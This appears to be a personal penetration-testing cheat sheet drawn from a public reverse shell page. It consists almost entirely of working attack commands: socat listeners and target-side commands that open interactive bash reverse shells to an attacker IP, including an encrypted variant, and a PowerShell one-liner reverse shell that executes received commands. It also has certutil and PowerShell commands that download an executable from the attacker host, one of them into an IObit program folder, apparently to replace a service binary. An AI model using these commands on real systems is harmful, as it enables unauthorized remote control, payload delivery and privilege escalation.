# Source - 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php

---
### Reverse shell on Linux with socat(Listener) - 

 ```bash
socat TCP-L:1234 FILE:`tty`,raw,echo=0 
```
### Target machine - 
 ```bash
 socat TCP:10.11.40.0:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
- **pty**, allocates a pseudoterminal on the target -- part of the stabilisation process
- **stderr**, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
 - **sigint**, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
 - **setsid**, creates the process in a new session
    sane, stabilises the terminal, attempting to "normalise" it.

### Encrypted connection - 
- #### Listener
	```bash
	socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0,FILE:tty,raw,echo=0 
	```
- #### Attacker -  
	```bash
 socat OPENSSL:10.10.10.5:53  EXEC:"bash -li",pty,stderr,sigint,setsid,sane
	```
		
### Powershell one liner for reverse shell -
```psh
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.40.0',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


### Transfer files to windows - 
```bash
certutil -urlcache -f http://<Our_IP>/filename filename	
```
 - With Powershell 
 ```bash
 (New-Object Net.WebClient).DownloadFile("http://10.11.40.0:80/ASCService.exe","C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe")
Invoke-WebRequest "http://10.11.40.0:80/ASCService.exe" -OutFile "ASCService.exe"
```